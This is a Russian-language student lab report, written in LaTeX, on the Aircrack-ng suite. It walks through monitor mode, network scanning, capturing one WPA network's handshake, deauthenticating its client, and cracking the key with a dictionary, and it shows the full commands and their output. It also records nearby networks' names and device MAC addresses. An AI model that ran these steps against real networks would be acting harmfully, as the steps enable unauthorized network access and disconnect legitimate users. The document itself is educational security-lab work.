
\documentclass[10pt,a4paper]{report}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{listings}

\usepackage[left=1.8cm, right=1cm, top=0.8cm, bottom=2cm, 
bindingoffset=0cm]{geometry}

\author{Кенть Никита}
\title{Лабораторная работа №6.\\
	SSL/TLC}
\begin{document}
	\maketitle
	\renewcommand{\thesection}{\arabic{section}}
	\tableofcontents
	\pagebreak
	
	\setcounter{totalnumber}{10}
	\setcounter{topnumber}{10}
	\setcounter{bottomnumber}{10}
	\renewcommand{\topfraction}{1}
	\renewcommand{\textfraction}{0}
	
	\section{Цель работы}
		Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP.
	\section{Изучение пакета Aircrack}
		\subsection{Описание основных утилит пакета Aircrack}
			\begin{itemize}
				\item Airodump-ng - утилита, предназначенная для захвата сырых пакетов протокола 802.11
и особенно подходящая для сбора WEP IVов (Векторов Инициализации) с последущим их
использованием в aircrack-ng.
				\item Aireplay-ng - Основная функция утилиты заключается в генерации трафика для последующего использования в aircrack-ng для взлома WEP и WPA-PSK ключей. 
				\item Aircrack-ng - утилита для взлома 802.11 WEP and WPA/WPA2-PSK ключей. 
			\end{itemize}
		\subsection{Запуск режима мониторинга на бестроводном интерфейсе}
			\begin{lstlisting}
ubuntu@ubuntu:~/aircrack-ng-1.2-beta3$ sudo airmon-ng start wlan0
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e 
PID	Name
1167	avahi-daemon
1168	avahi-daemon
1873	NetworkManager
2083	wpa_supplicant
10693	dhclient
Process with PID 10693 (dhclient) is running on interface wlan0

Interface	Chipset		Driver

mon0		Atheros AR9285	ath9k - [phy0]
wlan0		Atheros AR9285	ath9k - [phy0]
				(monitor mode enabled on mon1)

			\end{lstlisting}
		\subsection{Запустить утилиту airodump и изучить форматы вывода этой утилиты}
	airodump-ng <options> <interface>[,<interface>,...]

Опции:
--ivs : Сохранять только отловленные IVы. Короткая форма -i.
--gpsd : Использовать GPS. Короткая форма -g.
--write <prefix> : Перфикс файла дампа. Короткая форма -w.
--beacons : Записывать все маяки в файл дампа. Короткая форма -e.
--netmask <netmask> : Фильтровать точки по маске. Короткая форма -m.
--bssid <bssid> : Фильтровать точки по BSSID. Короткая форма -d.
--encrypt <suite> : Фильтровать точки по типу шифрования.
Короткая форма -t
-a : Фильтровать неасоциированых клиентов
	\section{Практическое задание}
		Запустим режим мониторинга на беспроводном интерфейсе
		\begin{lstlisting}
      ubuntu@ubuntu:~/aircrack-ng-1.2-beta3$ sudo airodump-ng mon0
CH 13 ][ Elapsed: 24 s ][ 2016-05-29 20:57                                         
                                                                                                                                               
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                               
 58:3F:54:B6:55:A0  -45       76        2    0   4  54e. WPA  TKIP   PSK  L90_5004                                                             
 00:1E:58:20:61:DC  -59       39       13    0   1  54e  WPA2 CCMP   PSK  542-122                                                              
 3A:B1:DB:83:49:FC  -69       17        0    0   1  54e. WPA2 CCMP   PSK  DIRECT-CG-BRAVIA                                                     
 4A:E2:44:67:2D:9B  -71       16        0    0  11  54e. WPA2 CCMP   PSK  DIRECT-Er-BRAVIA                                                     
 00:11:6B:1B:67:F8  -74       44       60    0  11  54   WPA  TKIP   PSK  13                                                                   
 84:A4:23:EF:87:79  -77       17       24    0   1  54e  WPA2 CCMP   PSK  Rostelecom_8778                                                      
 9C:37:F4:76:6A:90  -76       24        0    0  11  54e  WPA2 CCMP   PSK  HUAWEI-qCD4                                                          
 D4:6A:A8:0F:72:CE  -78       20        0    0   6  54e. WPA2 CCMP   PSK  HG8245vav                                                            
 D4:F9:A1:D4:69:2C  -82       20        0    0   9  54e  WPA2 CCMP   PSK  127                                                                  
 9C:37:F4:77:35:5C  -83       23        0    0   8  54e  WPA2 CCMP   PSK  HUAWEI-9f4T                                                          
 7C:A2:3E:2F:A7:DC  -84       10        0    0  11  54e  WPA2 CCMP   PSK  HUAWEI-Kjjd                                                          
 10:7B:EF:5A:63:70  -83        3        0    0   3  54e  WPA2 CCMP   PSK  WAAAAAGH!!!                                                          
 B0:C5:59:0E:B8:2D  -84       17        0    0   6  54e. WPA2 CCMP   PSK  AndroidAP                                                            
 88:A2:D7:F6:46:94  -84       21        6    0  13  54e  WPA2 CCMP   PSK  HUAWEI-PdNu                                                          
 AC:9E:17:7D:A1:C0  -86        0        0    0   6  54e  WPA2 CCMP   PSK  ASUSVV                                                               
 1C:B7:2C:ED:17:28  -86        6        0    0  12  54e  WPA2 CCMP   PSK  Shiva                                                                
                                                                                                                                                
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                      
                                                                                                                                                
 (not associated)   8C:99:E6:6C:59:BB  -74    0 - 1     26       24  RTK25,portal                                                               
 (not associated)   38:2D:E8:D1:1E:23  -79    0 - 1      0        1                                                                             
 (not associated)   44:6D:6C:4A:95:2E  -80    0 - 1      0        1  HUAWEI-3UR4                                                                
 (not associated)   48:E2:44:67:2D:9B  -81    0 - 1      0        4  HK_OnyxD937B2                                                              
 (not associated)   EC:59:E7:47:B1:BC  -82    0 - 1     14        2                                                                             
 (not associated)   74:2F:68:99:FF:CD  -87    0 - 1      0        1  HUAWEI-PdNu                                                                
 (not associated)   08:ED:B9:AB:C8:E5  -92    0 - 1      0        1                                                                             
 00:1E:58:20:61:DC  38:B1:DB:83:49:FC   -1    0e- 0      0       12                                                                             
 00:1E:58:20:61:DC  98:FE:94:89:AC:AC  -67    0e- 1     40       11  542-122                                                                    
 00:11:6B:1B:67:F8  24:E3:14:4C:B3:0E  -77    1 - 1      0       64                                                                             
 84:A4:23:EF:87:79  E0:19:1D:45:12:77   -1    5e- 0      0       24                                                                             
 10:7B:EF:5A:63:70  C4:85:08:3C:97:59  -74    0 - 6e     0        3            

		\end{lstlisting}
		
		Интересующая нас сеть:
		\begin{lstlisting}
 58:3F:54:B6:55:A0  -45       76        2    0   4  54e. WPA  TKIP   PSK  L90_5004   
		\end{lstlisting}
		Запустим сбор трафика для получения аутентификационных сообщений:
		\begin{lstlisting}
          ubuntu@ubuntu:~/aircrack-ng-1.2-beta3$ sudo airodump-ng mon0 --write airdump --bssid 58:3F:54:B6:55:A0  -c 4
		 CH  4 ][ Elapsed: 20 s ][ 2016-05-29 20:58 ][ WPA handshake: 58:3F:54:B6:55:A0                                         
                                                                                                                                 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                          
 58:3F:54:B6:55:A0  -26 100      231       46    0   4  54e. WPA  TKIP   PSK  L90_5004                                                                                                                                                                                            
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                                                                                                                    
 58:3F:54:B6:55:A0  98:FE:94:89:AC:AC  -65    2e- 1e     0       27                                                                             
		\end{lstlisting}
		К сети подключен один клиент с MAC-адресом 98:FE:94:89:AC:AC, проведем его деаутентификацию.

\begin{lstlisting}
ubuntu@ubuntu:~/aircrack-ng-1.2-beta3$ sudo aireplay-ng -0 1 -a 58:3F:54:B6:55:A0 -c 98:FE:94:89:AC:AC mon0
20:59:36  Waiting for beacon frame (BSSID: 58:3F:54:B6:55:A0) on channel 4
20:59:36  Sending 64 directed DeAuth. STMAC: [98:FE:94:89:AC:AC] [ 0|64 ACKs]

\end{lstlisting}
Произведем взлом используя словарь паролей.
Для того, что бы взлом происходил быстрее, создадим свой словарь паролей 
(dict.dic).
\begin{lstlisting}
ubuntu@ubuntu:~/aircrack-ng-1.2-beta3$ sudo aircrack-ng dump*.cap -w pass -b 58:3F:54:B6:55:A0
Opening dump-01.cap
Reading packets, please wait...



                                 Aircrack-ng 1.2 beta3


                   [00:00:00] 1 keys tested (315.33 k/s)


                          KEY FOUND! [ ver good password ]


      Master Key     : 56 D8 A7 2E 27 04 0B AB C8 06 86 04 87 5D 95 5C 
                       29 E0 93 45 20 9D E1 B4 07 31 0C 69 C8 8F F7 B8 

      Transient Key  : BC 69 C7 F0 D4 50 C6 14 6C 6E 66 C5 53 C2 D1 8E 
                       6D DC 47 FA 69 9C E2 06 70 FC AB F1 CC 37 13 CE 
                       1A 56 8C FA 83 5B 7B 9F F6 83 20 D8 99 7E 9D 3E 
                       31 0C AD 68 16 7C 8E 57 6B 1E 4C 18 08 FC 1E B3 

      EAPOL HMAC     : AC 2F A8 BA A4 28 EA F9 C9 EA 58 07 B4 2C D9 D7 


\end{lstlisting}
В результате видим подобранный пароль

\section{Выводы}
Aircrack-ng — набор программ, предназначенных для обнаружения беспроводных сетей, перехвата передаваемого через беспроводные сети трафика, аудита WEP и WPA/WPA2-PSK ключей шифрования (проверка стойкости), в том числе пентеста (Penetration test) беспроводных сетей (подверженность атакам на оборудование и атакам на алгоритмы шифрования). Программа работает с любыми беспроводными сетевыми адаптерами, драйвер которых поддерживает режим мониторинга (список можно найти на сайте программы).
Исходя из результатов работы, можно сделать вывод, что стоит подбирать пароль с умом, иначе могут возникнуть проблемы.
\end{document}